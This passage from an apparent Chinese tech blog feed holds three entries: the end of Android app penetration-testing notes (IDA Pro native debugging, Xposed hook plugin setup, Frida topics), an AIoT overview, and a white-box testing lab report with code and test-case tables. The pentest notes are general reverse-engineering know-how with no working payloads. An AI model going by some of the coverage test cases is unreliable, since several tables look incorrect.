src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113162245.png"></p></li></ol><h4 id="扩展-2"><a href="#扩展-2" class="headerlink" title="扩展-2"></a>扩展-2</h4><ol><li>使用Xpose插件：Inspeckage，直接在Xpose软件里下载</li></ol><h2 id="Android应用渗透测试——业务安全"><a href="#Android应用渗透测试——业务安全" class="headerlink" title="Android应用渗透测试——业务安全"></a>Android应用渗透测试——业务安全</h2><ol><li>二维码不校验  </li><li>url跳转  </li><li>任意文件读取</li></ol><p>不具体展开，和Web业务安全同样的。</p><h2 id="如何找客户端漏洞？"><a href="#如何找客户端漏洞？" class="headerlink" title="如何找客户端漏洞？"></a>如何找客户端漏洞？</h2><p>都在上述的知识点中</p><h2 id="Android应用渗透测试——应用调试"><a href="#Android应用渗透测试——应用调试" class="headerlink" title="Android应用渗透测试——应用调试"></a>Android应用渗透测试——应用调试</h2><h3 id="调试Smali"><a href="#调试Smali" class="headerlink" title="调试Smali"></a>调试Smali</h3><p>[TODO]</p><h3 id="调试native"><a href="#调试native" class="headerlink" title="调试native"></a>调试native</h3><ol><li><p>找到native方法<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113171058.png"></p></li><li><p>找到.so文件<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113171136.png"></p></li><li><p>IDA Pro 打开<br>发现export处[TODO]<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113171301.png"></p></li></ol><p>中文乱码设置：<br>alt + a，然后进行如下设置<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113171434.png" style="zoom:50%;" /></p><ol start="4"><li><p>使用IDA Pro进行分析</p></li><li><p>push android_x86_server 到 data/local/tmp<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113171926.png"></p></li></ol><h3 id="分析点"><a href="#分析点" class="headerlink" title="分析点"></a>分析点</h3><p>在输入的参数（比如用户名、密码）处下断点，通过查看运行时信息（终端显示的），分析其加密方式。不仅如此，证书校验等都可以使用这个动态调试的方法。</p><h2 id="移动应用程序渗透测试框架使用"><a href="#移动应用程序渗透测试框架使用" class="headerlink" title="移动应用程序渗透测试框架使用"></a>移动应用程序渗透测试框架使用</h2><h3 id="Xposed框架"><a href="#Xposed框架" class="headerlink" title="Xposed框架"></a>Xposed框架</h3><h4 id="安装及配置"><a href="#安装及配置" class="headerlink" title="安装及配置"></a>安装及配置</h4><p>[TODO]</p><h4 id="Xposed运行原理-TODO"><a href="#Xposed运行原理-TODO" class="headerlink" title="Xposed运行原理[TODO]"></a>Xposed运行原理[TODO]</h4><ol><li>Dalvik虚拟机在执行java层代码时如何识别JNI方法? </li></ol><ul><li>类型标识（accessFlags）<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113173105.png" style="zoom: 50%;" /></li><li>过程<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200113173028.png" style="zoom: 33%;" /></li></ul><ol start="2"><li>怎样才能将java层普通方法注册成JNI方法?</li><li>Xposed框架做了什么?</li></ol><h4 id="如何写一个Xposed插件-TODO"><a href="#如何写一个Xposed插件-TODO" class="headerlink" title="如何写一个Xposed插件[TODO]"></a>如何写一个Xposed插件[TODO]</h4><ol><li><p>打开AS在项目app目录下新建lib目录并将XposedBridgeApi-54.jar放到lib目录下 右键Add As Library将 jar包添加进依赖。</p></li><li><p>打开app目录下的build.gradle 将<br>compile files(‘lib/XposedBridgeApi-54.jar’)<br>更改为<br>compileOnly files(‘lib/XposedBridgeApi-54.jar’)</p></li><li><p>打开项目分支src/main目录下的AndroidManifest.xml 在application标签里面添加内容</p></li><li><p>新建Hook入口类HookMain 实 现 xposed的接的IXposedHookLoadPackage 并重写方法 handleLoadPackage ，这个写法格式是固定的。</p></li><li><p>在src/main/assets下新建文件xposed_init并将HookMain类并将hook的主入口类以包名+类名的格式写进去。<br>com.example.myapplication.HookMain</p></li></ol><h3 id="Frida框架-TODO"><a href="#Frida框架-TODO" class="headerlink" title="Frida框架[TODO]"></a>Frida框架[TODO]</h3><p>Frida是一个动态代码执行工具包。<br>通过Frida你可以把一段JavaScript注入到一个进程中去，或者把一个动态库加载到另一个进程中去，并且 Frida 是跨平台的，也就是说，你可以对Windows, macOS, GNU/Linux, iOS, Android以及QNX系统上的进程进行上述操作。</p><h4 id="Frida实验1——破解登入密码"><a href="#Frida实验1——破解登入密码" class="headerlink" title="Frida实验1——破解登入密码"></a>Frida实验1——破解登入密码</h4><h4 id="Frida实验2——解密"><a href="#Frida实验2——解密" class="headerlink" title="Frida实验2——解密"></a>Frida实验2——解密</h4><h4 id="扩展-1-1"><a href="#扩展-1-1" class="headerlink" title="扩展-1"></a>扩展-1</h4><p>注意：安装Frida时，一定要安装Frida tools</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Artificial_Intelligence_of_Things (AIoT)</title>
      <link href="/2020/01/03/Artificial_Intelligence_of_Things%20(AIoT)/"/>
      <url>/2020/01/03/Artificial_Intelligence_of_Things%20(AIoT)/</url>
      
        <content type="html"><![CDATA[<h1 id="Artificial-Intelligence-of-Things-AIoT"><a href="#Artificial-Intelligence-of-Things-AIoT" class="headerlink" title="Artificial Intelligence of Things (AIoT)"></a>Artificial Intelligence of Things (AIoT)</h1><h2 id="The-Ouline"><a href="#The-Ouline" class="headerlink" title="The Ouline"></a>The Ouline</h2><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227154047.png" style="zoom: 50%;" /><h2 id="What’s-AIoT"><a href="#What’s-AIoT" class="headerlink" title="What’s AIoT?"></a>What’s AIoT?</h2><p>AIoT（人工智能物联网）=AI（人工智能）+IoT（物联网）<br>The Artificial Intelligence of Things (AIoT) is the combination of artificial intelligence (AI) technologies with the Internet of Things (IoT) infrastructure to achieve more efficient IoT operations, improve human-machine interactions and enhance data management and analytics.</p><h2 id="AIoT-Hardware-Architecture"><a href="#AIoT-Hardware-Architecture" class="headerlink" title="AIoT Hardware Architecture"></a>AIoT Hardware Architecture</h2><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/Screen Shot 2019-12-27 at 10.27.03 AM.png" style="zoom:33%;" />  This is the  architecture of AIoT hardware. Here is a example of the specific equipment:  <h3 id="SI-61S-AI-Industrial-AI-Computer"><a href="#SI-61S-AI-Industrial-AI-Computer" class="headerlink" title="SI-61S-AI Industrial AI Computer"></a>SI-61S-AI Industrial AI Computer</h3><p>The SI-61S-AI is a highly scalable player with an <strong>artificial intelligence calculation analysis</strong> system developed for <strong>multi-screen video wall applications</strong>.<br>It is equipped with Intel’s latest 7th generation desktop processor and supports multiple players via one Matrox or AMD PCI-E (x8) graphics card, and perform artificial intelligence analysis through another NVIDIA GPU card for AI analysis.<br><strong>High recognition rate</strong> from AI analysis will provide on-site personnel with accurate data for better management and judgment.  </p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227103414.png" style="zoom: 67%;" /><h2 id="IoT-and-Data"><a href="#IoT-and-Data" class="headerlink" title="IoT and Data"></a>IoT and Data</h2><ul><li>Extension of IoT Applications(Consumer, industries, smart home, etc.)</li><li>Data Explosion(爆炸)</li><li>Artificial Intelligence of Things(IoT —&gt; Big Data —&gt; AI )<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227140121.png"></li></ul><h2 id="Data-driven-AIoT"><a href="#Data-driven-AIoT" class="headerlink" title="Data-driven AIoT"></a>Data-driven AIoT</h2><ul><li>Data Sources</li><li>Data Processing and management</li><li>Application-based analytics</li><li>Application &amp; sources</li></ul><h2 id="Data-Processing-and-management"><a href="#Data-Processing-and-management" class="headerlink" title="Data Processing and management"></a>Data Processing and management</h2><h3 id="1-Data-Collection"><a href="#1-Data-Collection" class="headerlink" title="1. Data Collection"></a>1. Data Collection</h3><ul><li>Filtering</li><li>Pre-processing</li><li>Storing</li><li>Ingestion(摄取)</li></ul><h3 id="2-1-Data-Discovery"><a href="#2-1-Data-Discovery" class="headerlink" title="2.1 Data Discovery"></a>2.1 Data Discovery</h3><ul><li>Data Fusion（数据融合，集成多个数据源）</li><li>Enrichment（使用模糊逻辑辅助搜索；获得相关的源地址信息；纠正拼写错误等）</li><li>Modeling（建模）</li><li>Indexing（标引）</li><li>Annotation（标注）</li></ul><h3 id="2-2-Data-Analytics"><a href="#2-2-Data-Analytics" class="headerlink" title="2.2 Data Analytics"></a>2.2 Data Analytics</h3><ul><li>Data Semantic（数据语义）</li><li>Meta-data Management（元数据管理）</li><li>Reasoning Contextual Data（上下文数据推理）</li></ul><h3 id="3-Data-Protection"><a href="#3-Data-Protection" class="headerlink" title="3. Data Protection"></a>3. Data Protection</h3><ul><li>Anonymize（匿名化）</li><li>Data Masking（数据屏蔽，创建结构相似但不真实的数据版本，用以保护实际数据）</li><li>Data Transformation（数据转换，从一种格式或结构转换为另一种格式或结构的过程）</li><li>Sharing Control（共享控制）</li></ul><p>###4.  Data Publication</p><ul><li>Publication（发表）</li><li>Open Data Sharing（开放的共享控制）</li><li>Personal Data Sharing（个人数据共享）</li><li>Visualization and Report（可视化报告）</li></ul><h2 id="AI-Based-Deep-Analysis"><a href="#AI-Based-Deep-Analysis" class="headerlink" title="AI-Based Deep Analysis"></a>AI-Based Deep Analysis</h2><h3 id="Decision-Management（决策管理）"><a href="#Decision-Management（决策管理）" class="headerlink" title="Decision Management（决策管理）"></a>Decision Management（决策管理）</h3><h3 id="Discovery-and-Exploration（发现和探索）"><a href="#Discovery-and-Exploration（发现和探索）" class="headerlink" title="Discovery and Exploration（发现和探索）"></a>Discovery and Exploration（发现和探索）</h3><h3 id="Reporting-and-Analytics（报告和分析）"><a href="#Reporting-and-Analytics（报告和分析）" class="headerlink" title="Reporting and Analytics（报告和分析）"></a>Reporting and Analytics（报告和分析）</h3><h3 id="Predictive-Analytics（预测分析）and-Modelling"><a href="#Predictive-Analytics（预测分析）and-Modelling" class="headerlink" title="Predictive Analytics（预测分析）and Modelling"></a>Predictive Analytics（预测分析）and Modelling</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191227145728.png" style="zoom: 33%;" /><h2 id="AI-algorithms-used-in-the-field-of-data-analysis"><a href="#AI-algorithms-used-in-the-field-of-data-analysis" class="headerlink" title="AI algorithms used in the field of data analysis"></a>AI algorithms used in the field of data analysis</h2><p>// TODO</p><ul><li><p>Linear regression（线性回归）<br>举例：y = B0 + B1 * x  给定输入x，我们将预测y，线性回归学习算法的目标是找到系数B0和B1的值</p></li><li><p>Logistic Regression（逻辑回归）<br>The prediction of the output is worth transforming using nonlinear functions called logical functions</p></li><li><p>Bayes Theorem（朴素贝叶斯）</p></li><li><p>KNN</p></li><li><p>Support Vector Machine</p></li><li><p>Random Forest</p></li><li><p>…</p></li></ul><h2 id="Trustworthiness-in-AIoT"><a href="#Trustworthiness-in-AIoT" class="headerlink" title="Trustworthiness in AIoT"></a>Trustworthiness in AIoT</h2><p>// TODO，此处关于区块链，后续文章补充</p><h2 id="Secure-Decentralized-Artificial-Intelligence-of-Things-AI-Blockchain-IoT"><a href="#Secure-Decentralized-Artificial-Intelligence-of-Things-AI-Blockchain-IoT" class="headerlink" title="Secure Decentralized Artificial Intelligence of Things (AI + Blockchain + IoT)"></a>Secure Decentralized Artificial Intelligence of Things (AI + Blockchain + IoT)</h2><p>![](<a href="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/Screen" target="_blank" rel="noopener">https://image-host-toky.oss-cn-shanghai.aliyuncs.com/Screen</a> Shot 2019-12-27 at 10.47.00 AM.png)</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.businesswire.com/news/home/20191203005602/en/Global-Artificial-Intelligence-IoT-AIoT-Convergence-Market" target="_blank" rel="noopener">https://www.businesswire.com/news/home/20191203005602/en/Global-Artificial-Intelligence-IoT-AIoT-Convergence-Market</a>   </p><p>[2] <a href="https://www.roboticschina.com/news/2348.html" target="_blank" rel="noopener">https://www.roboticschina.com/news/2348.html</a></p><p>[3] <a href="https://ieeexplore.ieee.org/document/8603082" target="_blank" rel="noopener">https://ieeexplore.ieee.org/document/8603082</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】白盒测试</title>
      <link href="/2020/01/01//articles/2020/01/01/1577875124044.html/"/>
      <url>/2020/01/01//articles/2020/01/01/1577875124044.html/</url>
      
        <content type="html"><![CDATA[<h1 id="实验五-白盒测试"><a href="#实验五-白盒测试" class="headerlink" title="实验五 白盒测试"></a>实验五 白盒测试</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229104834.png"><br>图：封面</p><h2 id="开发语言及实现平台或实验环境"><a href="#开发语言及实现平台或实验环境" class="headerlink" title="开发语言及实现平台或实验环境"></a>开发语言及实现平台或实验环境</h2><p>在 Windows 7 或 Windows 10 操作系统上，使用 C，C++，C#或 Java 语言 第 10 页 共 26 页<br> 及对应的开发环境(IDE) 【实验目的】</p><ol><li>熟悉掌握白盒测试的原理</li><li>掌握白盒测试过程，了解逻辑覆盖，独立路径测试、循环测试等白盒测<br>试方法并能根据问题设计测试样例。</li></ol><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol><li>要求学生能够理解白盒测试的相关概念和白盒测试的过程、方法。</li><li>具体为每一组，每组二——五人，根据实验题目编写出对应的 c 语言或<br>c++语言程序，组间相互交换程序，按白盒测试的方法进行测试。</li></ol><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>对给定的模块，采用语句覆盖、判定覆盖、条件覆盖、判定\条件覆盖、 分组条件覆盖和路径覆盖的方法设计测试用例。</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>预习相关课堂内容，了解测试对象</li><li>编写实验材料源代码，画出程序流程图。</li><li>根据对应的实验题目，设计逻辑覆盖和路径覆盖的测试样例。 4. 执行测试样例，分析测试结果。</li><li>填写试验报告。</li></ol><h2 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h2><ol><li>逻辑覆盖根据下述题目，给出语句覆盖、判定覆盖、条件覆盖、判定\条件覆盖、<br>分组条件覆盖和路径覆盖的测试用例并执行测试。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DoWork</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x&gt;<span class="number">3</span>)&amp;&amp;(z&lt;<span class="number">10</span>)) &#123;</span><br><span class="line">        k=k* y<span class="number">-1</span>;</span><br><span class="line">        j=<span class="built_in">sqrt</span>(k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((x==<span class="number">4</span>)‖(y&gt;<span class="number">5</span>)) &#123;</span><br><span class="line">    j=x*y+<span class="number">10</span>;</span><br><span class="line">    j=j%<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>N-S 流程图测试用例设计和执行<br>编写一元二次方程( ax2+bx+c=0)算法，设计路径测试用例并执行测<br>试。</li><li>基本路径测试用例设计和执行 编写对有序表进行折半查找的算法，计算圈复杂度，设计测试用例并<br>执行独立路径测试。</li></ol><h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><h3 id="实验材料一"><a href="#实验材料一" class="headerlink" title="实验材料一"></a>实验材料一</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DoWork</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((x&gt;<span class="number">3</span>)&amp;&amp;(z&lt;<span class="number">10</span>)) &#123;</span><br><span class="line">        k=k* y<span class="number">-1</span>;</span><br><span class="line">        j=<span class="built_in">sqrt</span>(k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((x==<span class="number">4</span>)‖(y&gt;<span class="number">5</span>)) &#123;</span><br><span class="line">        j = x*y+<span class="number">10</span>;</span><br><span class="line">        j = j%<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实验材料二"><a href="#实验材料二" class="headerlink" title="实验材料二"></a>实验材料二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;<span class="comment">//导入java.util包下的Scanner类</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnitaryQuadraticEquation</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> argsA = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> argsB = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> argsC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inputCoefficient</span><span class="params">(UnitaryQuadraticEquation equation)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> argsA = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> argsB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> argsC = <span class="number">0</span>;</span><br><span class="line">        System.out.print(<span class="string">"======求 ax^2+bx+c=0 的根======"</span>+<span class="string">"\n"</span>);</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"请输入a的值(a!=0)："</span>);</span><br><span class="line">            argsA = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (argsA == <span class="number">0</span>);</span><br><span class="line">        equation.argsA = argsA;</span><br><span class="line">        System.out.println(<span class="string">"请输入b的值："</span>);</span><br><span class="line"></span><br><span class="line">        argsB = scanner.nextInt();</span><br><span class="line">        equation.argsB = argsB;</span><br><span class="line">        System.out.println(<span class="string">"请输入c的值："</span>);</span><br><span class="line"></span><br><span class="line">        argsC = scanner.nextInt();</span><br><span class="line">        equation.argsC = argsC;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">calculateRoot</span><span class="params">(UnitaryQuadraticEquation equation)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//运用求根公式，并且Math.sqrt()为开平方根</span></span><br><span class="line">            <span class="keyword">double</span> rootX1 = ((-equation.argsB + Math.sqrt(equation.argsB * equation.argsB</span><br><span class="line">                    - <span class="number">4</span> * equation.argsA * equation.argsC)) / (<span class="number">2</span> * equation.argsA));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//运用求根公式，并且Math.sqrt()为开平方根</span></span><br><span class="line">            <span class="keyword">double</span> rootX2 = ((-equation.argsB - Math.sqrt(equation.argsB * equation.argsB</span><br><span class="line">                    - <span class="number">4</span> * equation.argsA * equation.argsC)) / (<span class="number">2</span> * equation.argsA));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 第一个根X1</span></span><br><span class="line">            System.out.println(<span class="string">"x1 = "</span> + rootX1);</span><br><span class="line">            <span class="comment">// 第一个根X2</span></span><br><span class="line">            System.out.println(<span class="string">"x2 = "</span> + rootX2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        UnitaryQuadraticEquation equation = <span class="keyword">new</span> UnitaryQuadraticEquation();</span><br><span class="line">        equation.inputCoefficient(equation);</span><br><span class="line">        equation.calculateRoot(equation);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实验材料三"><a href="#实验材料三" class="headerlink" title="实验材料三"></a>实验材料三</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinarySearch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对有序表对折半查找</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orderlyTable 有序表（由小到大排列）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> key 要查找的关键字</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回要查找的关键字下标，若没有查找到则返回-1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">BinarySearch</span><span class="params">(<span class="keyword">int</span>[] orderlyTable, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low, high, mid;</span><br><span class="line">        low = <span class="number">0</span>;</span><br><span class="line">        high = orderlyTable.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">            mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (key &lt; orderlyTable[mid]) &#123;</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; orderlyTable[mid]) &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> key = <span class="number">0</span>;</span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            System.out.println(<span class="string">"请输入要查找的关键词："</span>);</span><br><span class="line">            key = scanner.nextInt();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 有序表</span></span><br><span class="line">            <span class="keyword">int</span>[] orderlyTable = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> &#125;;</span><br><span class="line">            <span class="comment">// 调用BinarySearch方法计算关键词下标</span></span><br><span class="line">            <span class="keyword">int</span> index = BinarySearch(orderlyTable, key);</span><br><span class="line">            System.out.println(<span class="string">"关键词的下标是（-1表示未找到）："</span> + index);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试用例及设计"><a href="#测试用例及设计" class="headerlink" title="测试用例及设计"></a>测试用例及设计</h2><h3 id="实验材料1：逻辑覆盖"><a href="#实验材料1：逻辑覆盖" class="headerlink" title="实验材料1：逻辑覆盖"></a>实验材料1：逻辑覆盖</h3><p>1.语句覆盖<br>由于语句覆盖至要求每个语句执行一次即可，因此设计如下测试用例  </p><table><thead><tr><th>用例ID</th><th>X</th><th>Y</th><th>Z</th><th>K</th></tr></thead><tbody><tr><td>1</td><td>4</td><td>6</td><td>5</td><td>5</td></tr></tbody></table><p>2.判定覆盖</p><p>   判定覆盖是在语句覆盖的基础上，使得程序中的每个判定分值都覆盖，因此设计如下用例  </p><table><thead><tr><th>用例ID</th><th>X</th><th>Y</th><th>Z</th><th>K</th></tr></thead><tbody><tr><td>1</td><td>4</td><td>6</td><td>5</td><td>5</td></tr><tr><td>2</td><td>2</td><td>2</td><td>2</td><td>5</td></tr></tbody></table><p>3.条件覆盖</p><p>   在语句覆盖的基础上，使得程序中的每个条件（原子条件）都能获得可能的结果，因此设计如下用例  </p><table><thead><tr><th>用例ID</th><th>X</th><th>Y</th><th>Z</th><th>K</th></tr></thead><tbody><tr><td>1</td><td>4</td><td>5</td><td>5</td><td>5</td></tr></tbody></table><p>4.判定条件覆盖</p><p>   判定/条件覆盖是使得判定的每个条件都取到可能的值（即满足判定覆盖），也使得条件满足每个可能的结果（即满足条件覆盖）因此设计如下用例  </p><table><thead><tr><th>用例ID</th><th>X</th><th>Y</th><th>Z</th><th>K</th></tr></thead><tbody><tr><td>1</td><td>4</td><td>6</td><td>5</td><td>5</td></tr></tbody></table><p>5.条件组合覆盖</p><p>   条件组合覆盖是指设计足够多的测试用例，使得每个判定中的条件的各种可能组合都至少出现一次。</p><p>   可能的条件组合：</p><ul><li><ol><li>x&gt;3, z&lt;10, x=4, y&gt;5</li></ol></li><li><ol start="2"><li>x&gt;3, z&gt;=10, x=4, y&gt;5</li></ol></li><li><ol start="3"><li>x&gt;3, z&lt;10, x!=4, y&gt;5</li></ol></li><li><ol start="4"><li>x&gt;3, z&gt;=10, x!=4, y&gt;5</li></ol></li><li><ol start="5"><li>x&gt;3, z&lt;10, x=4, y&lt;=5</li></ol></li><li><ol start="6"><li>x&gt;3, z&gt;=10, x=4, y&lt;=5</li></ol></li><li><ol start="7"><li>x&gt;3, z&gt;=10, x!=4, y&lt;=5</li></ol></li><li>….</li></ul><p>相应的测试用例为：</p><table><thead><tr><th>用例ID</th><th>X</th><th>Y</th><th>Z</th><th>K</th></tr></thead><tbody><tr><td>1</td><td>4</td><td>6</td><td>5</td><td>5</td></tr><tr><td>2</td><td>4</td><td>6</td><td>12</td><td>5</td></tr><tr><td>3</td><td>5</td><td>6</td><td>5</td><td>5</td></tr><tr><td>4</td><td>5</td><td>6</td><td>12</td><td>5</td></tr><tr><td>5</td><td>4</td><td>5</td><td>5</td><td>5</td></tr><tr><td>6</td><td>4</td><td>5</td><td>12</td><td>5</td></tr><tr><td>7</td><td>5</td><td>5</td><td>12</td><td>5</td></tr><tr><td>…</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>6.路径覆盖测试</p><p>   